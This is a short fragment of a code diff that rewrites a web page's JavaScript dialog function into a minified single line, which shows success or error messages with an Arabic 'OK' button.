-    dialog.style.display = 'flex';
-    
-    dConfirmBtn.onclick = () => {
-      closeDialog();
-      setTimeout(resetDialogToDefault, 300);
-    };
-  }
+  function showDialog(type,title,msg){els.dIcon.textContent=type==='success'?'✅':'❌';els.dTitle.textContent=title;els.dMsg.textContent=msg;els.dConfirmBtn.style.background=type==='success'?'#4CAF50':'#F44336';els.dConfirmBtn.textContent="حسناً";els.dCancelBtn.classList.add('hidden');els.dialog.style.display='flex';els.dConfirmBtn.onclick=()=>{closeDialog();setTimeout(resetDialogToDefault,300);};}
 </script>
 </body>
 </html>
